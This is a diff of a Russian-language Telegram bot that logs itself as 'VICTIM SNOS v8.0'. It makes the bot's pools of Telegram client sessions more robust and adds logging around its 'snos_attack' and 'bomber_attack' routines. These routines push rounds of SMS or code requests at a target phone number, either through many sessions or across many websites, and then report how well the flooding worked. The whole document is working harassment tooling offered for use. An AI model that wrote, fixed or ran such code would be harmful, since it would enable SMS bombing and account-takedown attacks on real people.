@@ -98,6 +98,7 @@ ALLOWED_USERS = set()
 user_sessions = {}
 active_attacks = {}
 active_bombers = {}
+sessions_creation_lock = {}
 
 class SnosState(StatesGroup):
     waiting_phone = State()
@@ -270,11 +271,24 @@ class MailTM:
             return False
 
 
-# ---------- СЕССИИ ----------
+# ---------- ИСПРАВЛЕННОЕ СОЗДАНИЕ СЕССИЙ ----------
 def get_user_session_dir(user_id: int) -> str:
     return f"sessions/user_{user_id}"
 
+def count_user_sessions_files(user_id: int) -> int:
+    """Подсчет существующих файлов сессий пользователя"""
+    session_dir = get_user_session_dir(user_id)
+    if not os.path.exists(session_dir):
+        return 0
+    
+    count = 0
+    for f in os.listdir(session_dir):
+        if f.startswith("session_") and f.endswith(".session"):
+            count += 1
+    return count
+
 async def create_single_session(session_file: str, idx: int) -> dict:
+    """Создание одной сессии"""
     try:
         client = Client(
             session_file, 
@@ -286,33 +300,94 @@ async def create_single_session(session_file: str, idx: int) -> dict:
             system_version="iOS 17.0"
         )
         await client.connect()
+        logger.info(f"Сессия {idx} создана успешно")
         return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0}
-    except:
+    except Exception as e:
+        logger.error(f"Ошибка создания сессии {idx}: {e}")
         return None
 
-async def create_user_sessions(user_id: int) -> list:
+async def create_user_sessions(user_id: int, start_from: int = 0) -> tuple:
+    """
+    Создает сессии для пользователя начиная с указанного индекса
+    Возвращает (новые_сессии, всего_создано)
+    """
     session_dir = get_user_session_dir(user_id)
-    if os.path.exists(session_dir):
-        shutil.rmtree(session_dir)
     os.makedirs(session_dir, exist_ok=True)
     
-    sessions = []
-    batch_size = 20
-    for batch_start in range(0, SESSIONS_PER_USER, batch_size):
-        tasks = []
-        for i in range(batch_start, min(batch_start + batch_size, SESSIONS_PER_USER)):
-            session_file = f"{session_dir}/session_{i}"
-            tasks.append(create_single_session(session_file, i))
-        
-        results = await asyncio.gather(*tasks)
-        for s in results:
-            if s:
-                sessions.append(s)
-        await asyncio.sleep(2)
+    existing_count = count_user_sessions_files(user_id)
+    logger.info(f"Пользователь {user_id}: найдено {existing_count} существующих сессий")
     
-    return sessions
+    if existing_count >= SESSIONS_PER_USER:
+        logger.info(f"Пользователь {user_id}: все {SESSIONS_PER_USER} сессий уже существуют")
+        return [], existing_count
+    
+    # Загружаем существующие сессии
+    sessions = []
+    for i in range(existing_count):
+        session_file = f"{session_dir}/session_{i}"
+        if os.path.exists(f"{session_file}.session"):
+            sess = await create_single_session(session_file, i)
+            if sess:
+                sessions.append(sess)
+    
+    logger.info(f"Пользователь {user_id}: загружено {len(sessions)} существующих сессий")
+    
+    # Создаем недостающие сессии
+    need_to_create = SESSIONS_PER_USER - len(sessions)
+    if need_to_create > 0:
+        logger.info(f"Пользователь {user_id}: нужно создать еще {need_to_create} сессий")
+        
+        batch_size = 10  # Уменьшенный размер батча для стабильности
+        for batch_start in range(len(sessions), SESSIONS_PER_USER, batch_size):
+            batch_end = min(batch_start + batch_size, SESSIONS_PER_USER)
+            tasks = []
+            
+            for i in range(batch_start, batch_end):
+                session_file = f"{session_dir}/session_{i}"
+                if not os.path.exists(f"{session_file}.session"):
+                    tasks.append(create_single_session(session_file, i))
+                else:
+                    # Если файл есть, но сессия не загружена - загружаем
+                    sess = await create_single_session(session_file, i)
+                    if sess:
+                        sessions.append(sess)
+            
+            if tasks:
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                for r in results:
+                    if r and not isinstance(r, Exception):
+                        sessions.append(r)
+            
+            logger.info(f"Пользователь {user_id}: создано {len(sessions)}/{SESSIONS_PER_USER} сессий")
+            await asyncio.sleep(2)  # Пауза между батчами
+    
+    return sessions, len(sessions)
+
+async def ensure_user_sessions(user_id: int):
+    """Проверяет и создает сессии для пользователя"""
+    if user_id in sessions_creation_lock and sessions_creation_lock[user_id]:
+        logger.info(f"Пользователь {user_id}: сессии уже создаются")
+        return
+    
+    sessions_creation_lock[user_id] = True
+    
+    try:
+        if user_id not in user_sessions:
+            user_sessions[user_id] = {"sessions": [], "ready": False, "task": None, "total": 0}
+        
+        sessions, total = await create_user_sessions(user_id)
+        user_sessions[user_id]["sessions"] = sessions
+        user_sessions[user_id]["total"] = total
+        user_sessions[user_id]["ready"] = True
+        
+        logger.info(f"Пользователь {user_id}: готово {len(sessions)}/{SESSIONS_PER_USER} сессий")
+    finally:
+        sessions_creation_lock[user_id] = False
 
 async def refresh_user_sessions(user_id: int):
+    """Полное обновление сессий пользователя"""
+    logger.info(f"Обновление сессий для пользователя {user_id}...")
+    
     if user_id in user_sessions:
         old_data = user_sessions[user_id]
         for s in old_data.get("sessions", []):
@@ -323,15 +398,23 @@ async def refresh_user_sessions(user_id: int):
         if old_data.get("task") and not old_data["task"].done():
             old_data["task"].cancel()
     
-    new_sessions = await create_user_sessions(user_id)
-    user_sessions[user_id] = {"sessions": new_sessions, "ready": True, "task": None}
+    # Удаляем старую папку
+    session_dir = get_user_session_dir(user_id)
+    if os.path.exists(session_dir):
+        shutil.rmtree(session_dir)
+    
+    # Создаем заново
+    user_sessions[user_id] = {"sessions": [], "ready": False, "task": None, "total": 0}
+    await ensure_user_sessions(user_id)
 
 async def get_user_sessions_batch(user_id: int, count: int) -> list:
+    """Получает несколько доступных сессий"""
     if user_id not in user_sessions or not user_sessions[user_id]["ready"]:
         return []
     
     current_time = time.time()
     available = []
+    
     for s in user_sessions[user_id]["sessions"]:
         if not s["in_use"] and s["flood_until"] < current_time:
             if current_time - s["last_used"] >= SESSION_DELAY:
@@ -339,9 +422,11 @@ async def get_user_sessions_batch(user_id: int, count: int) -> list:
     
     available.sort(key=lambda x: x["last_used"])
     selected = available[:count]
+    
     for s in selected:
         s["in_use"] = True
         s["last_used"] = current_time
+    
     return selected
 
 def release_user_sessions(sessions: list):
@@ -349,24 +434,13 @@ def release_user_sessions(sessions: list):
         if s:
             s["in_use"] = False
 
-async def ensure_user_sessions(user_id: int):
-    if user_id not in user_sessions:
-        user_sessions[user_id] = {"sessions": [], "ready": False, "task": None}
-        async def create_task():
-            sessions = await create_user_sessions(user_id)
-            user_sessions[user_id]["sessions"] = sessions
-            user_sessions[user_id]["ready"] = True
-            user_sessions[user_id]["task"] = None
-        task = asyncio.create_task(create_task())
-        user_sessions[user_id]["task"] = task
-
 def get_user_sessions_count(user_id: int) -> int:
     if user_id in user_sessions:
-        return len(user_sessions[user_id]["sessions"])
+        return user_sessions[user_id].get("total", len(user_sessions[user_id].get("sessions", [])))
     return 0
 
 def is_user_sessions_ready(user_id: int) -> bool:
-    return user_id in user_sessions and user_sessions[user_id]["ready"]
+    return user_id in user_sessions and user_sessions[user_id].get("ready", False)
 
 
 # ---------- СНОС ----------
@@ -402,6 +476,9 @@ async def snos_attack(user_id: int, phone: str, rounds: int, progress_callback=N
     for rnd in range(1, rounds + 1):
         sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
         if not sessions:
+            logger.warning(f"Раунд {rnd}: нет доступных сессий")
+            if progress_callback:
+                await progress_callback(rnd, rounds, ok, err)
             await asyncio.sleep(5)
             continue
         
@@ -421,6 +498,8 @@ async def snos_attack(user_id: int, phone: str, rounds: int, progress_callback=N
         release_user_sessions(sessions)
         if progress_callback:
             await progress_callback(rnd, rounds, ok, err)
+        
+        logger.info(f"Снос раунд {rnd}/{rounds}: отправлено {round_ok}, ошибок {round_err}")
         if rnd < rounds:
             await asyncio.sleep(ROUND_DELAY)
     
@@ -467,6 +546,8 @@ async def bomber_attack(phone: str, rounds: int, progress_callback=None) -> tupl
             
             if progress_callback:
                 await progress_callback(rnd, rounds, ok, err)
+            
+            logger.info(f"Бомбер раунд {rnd}/{rounds}: успешно {round_ok}, ошибок {round_err}")
             if rnd < rounds:
                 await asyncio.sleep(BOMBER_DELAY)
     
@@ -571,10 +652,11 @@ def generate_bomber_report(phone: str, results: list, ok: int, err: int) -> str:
         f"Успешно: {ok}",
         f"Ошибок: {err}",
         "=" * 50,
-        ""
+        "",
+        "Сайт - Удачно/Неудачно",
+        "-" * 30
     ]
     
-    # Группируем по сайтам
     site_stats = {}
     for r in results:
         site = r.get('site', 'Unknown')
@@ -585,8 +667,6 @@ def generate_bomber_report(phone: str, results: list, ok: int, err: int) -> str:
         else:
             site_stats[site]["err"] += 1
     
-    lines.append("Сайт - Удачно/Неудачно")
-    lines.append("-" * 30)
     for site, stats in sorted(site_stats.items()):
         status = "Удачно" if stats["ok"] > 0 else "Неудачно"
         lines.append(f"{site}: {status} ({stats['ok']}/{stats['ok']+stats['err']})")
@@ -669,7 +749,11 @@ async def start(msg: types.Message):
         await msg.answer(f"<b>ДОСТУП ЗАПРЕЩЕН</b>\n\nВаш ID: <code>{user_id}</code>")
         return
     
-    await ensure_user_sessions(user_id)
+    # Запускаем создание сессий в фоне
+    if user_id not in user_sessions or not user_sessions[user_id].get("ready"):
+        asyncio.create_task(ensure_user_sessions(user_id))
+        await msg.answer("Запущено создание сессий. Это займет 3-5 минут...")
+    
     sessions_count = get_user_sessions_count(user_id)
     sessions_ready = is_user_sessions_ready(user_id)
     
@@ -750,17 +834,22 @@ async def refresh_sessions(cb: types.CallbackQuery):
     if user_id in active_attacks:
         await cb.answer("Нельзя во время сноса!", show_alert=True)
         return
+    
+    await cb.answer("Обновление сессий...")
     asyncio.create_task(refresh_user_sessions(user_id))
-    await cb.message.answer("Обновление сессий запущено...")
+    await cb.message.answer("Обновление сессий запущено. Это займет 3-5 минут.")
 
 @dp.callback_query(F.data == "status")
 async def status(cb: types.CallbackQuery):
     user_id = cb.from_user.id
+    sessions_count = get_user_sessions_count(user_id)
+    sessions_ready = is_user_sessions_ready(user_id)
+    
     await edit_banner(
         cb,
         f"<b>СТАТУС</b>\n\n"
         f"ID: <code>{user_id}</code>\n"
-        f"Сессии: {get_user_sessions_count(user_id)}/{SESSIONS_PER_USER}\n"
+        f"Сессии: {sessions_count}/{SESSIONS_PER_USER} ({'Готовы' if sessions_ready else 'Загрузка'})\n"
         f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\n"
         f"SMS/раунд: {SMS_PER_ROUND}\n"
         f"Задержка: {SESSION_DELAY}с",
@@ -1004,7 +1093,7 @@ async def init_mailtm():
 
 async def main():
     load_allowed_users()
-    logger.info(f"VICTIM SNOS v8.0 запуск...")
+    logger.info(f"VICTIM SNOS v8.0 запуск... Сессий на пользователя: {SESSIONS_PER_USER}")
     await bot.delete_webhook(drop_pending_updates=True)
     asyncio.create_task(init_mailtm())
     await dp.start_polling(bot)
